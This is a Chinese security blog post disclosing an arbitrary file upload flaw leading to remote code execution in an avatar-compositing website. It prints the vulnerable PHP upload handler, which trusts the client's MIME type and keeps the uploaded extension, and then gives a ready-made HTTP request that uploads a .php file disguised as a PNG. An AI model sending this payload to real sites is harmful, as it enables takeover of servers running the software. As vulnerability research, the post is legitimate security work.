#  某渐变头像合成网站系统存在任意文件上传漏洞(RCE)   
原创 Mstir  星悦安全   2025-02-07 04:36  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
源码介绍 : 渐变头像合成网站的操作简单便捷，用户只需上传自己的头像，选择喜欢的头像框，点击一键合成即可生成专属定制头像。网站提供了167种不同风格的头像框供选择，用户也可以自己添加素材。生成后的头像可以直接下载保存到手机上，还可以选择是否添加水印。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dJDu4wuekhNwp4icgnuQENicrlFHiaJQBPN8VvLEoSYxsYQ0yEnD8qGJEpWicDwYUzj5S1KdqJ5FHcsw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dJDu4wuekhNwp4icgnuQENiciblcyoeEelGkFh0MedPcErmEC9dU74ynlCOkONnnicHqMTQTr2kGtjPQ/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞研究&复现  
  
    这类简单的源码，遂直接用自己写的自动化工具去审计了，目前已实现仅有5%误报率，自动验证并生成Payload及审计报告.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dJDu4wuekhNwp4icgnuQENicO1ZLjub2UsoicABc7bFYyAzuttZ9HbmLSW9ibPmCzvrbLBDpkvxfM59Q/640?wx_fmt=png&from=appmsg "")  
  
漏洞点位于 /uploadImage.php 通过$FILES函数获取上传的文件，并写入到 /uploads/ 目录中，过滤仅是简单的 MINE-TYPE 的验证，导致漏洞产生.  
  
```
<?phpheader('Access-Control-Allow-Origin: *');header('Content-Type: application/json');$uploadDir = __DIR__ . '/uploads';if (!is_dir($uploadDir)) {    mkdir($uploadDir, 0755, true);}$response = ['success' => false, 'message' => '', 'url' => ''];if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {    $file = $_FILES['image'];    // 检查上传错误    if ($file['error'] !== UPLOAD_ERR_OK) {        $response['message'] = '上传过程中发生错误。';        echo json_encode($response);        exit;    }    // 验证文件类型    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];    if (!in_array($file['type'], $allowedTypes)) {        $response['message'] = '仅支持JPEG, PNG和GIF格式的图片。';        echo json_encode($response);        exit;    }    // 验证文件大小    $maxSize = 5 * 1024 * 1024;    if ($file['size'] > $maxSize) {        $response['message'] = '文件大小不能超过5MB。';        echo json_encode($response);        exit;    }    // 生成唯一文件名    $fileExt = pathinfo($file['name'], PATHINFO_EXTENSION);    $uniqueName = uniqid('avatar_', true) . '.' . $fileExt;    $targetPath = $uploadDir . '/' . $uniqueName;    // 移动上传文件    if (move_uploaded_file($file['tmp_name'], $targetPath)) {        // 获取当前域名        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";        $domain = $protocol . $_SERVER['HTTP_HOST'];        // 构建图片URL        $imageUrl = $domain . '/uploads/' . $uniqueName;        $response['success'] = true;        $response['message'] = '文件上传成功。';        $response['url'] = $imageUrl;    } else {        $response['message'] = '文件移动失败。';    }} else {    $response['message'] = '无效的请求。';}echo json_encode($response);?>
```  
  
  
    这里对于Payload的验证模式是基于本地验证的，能保证准确率，不必担心给出不准的Payload.  
  
Payload:  
  
```
POST /uploadImage.php HTTP/1.1Host: 127.0.0.1Content-Length: 199User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySVCSfotbAwRBzkeUAccept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarySVCSfotbAwRBzkeUContent-Disposition: form-data; name="image"; filename="aaa.php"Content-Type: image/png<?php phpinfo();?>------WebKitFormBoundarySVCSfotbAwRBzkeU--
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dJDu4wuekhNwp4icgnuQENicu6r0Uf60PEyTjrj3yaY02f0TMG0jDxxQwkEWiaSBYhFfzVk5TUOfcRg/640?wx_fmt=png&from=appmsg "")  
## 0x04 公开交流群  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**头像合成源码关注公众号，发送 250207 获取!**  
  
  
  
  
**开了个星悦安全公开交流4群，🈲发公众号，纯粹研究技术，还会拉一些大佬，希望大家多多交流.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dJDu4wuekhNwp4icgnuQENicHFAPBDGk7cjLLClF5JItNRMMia1tzrGwFiaP5HaLmx8yUaBEiaZa50C3A/640?wx_fmt=jpeg&from=appmsg "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
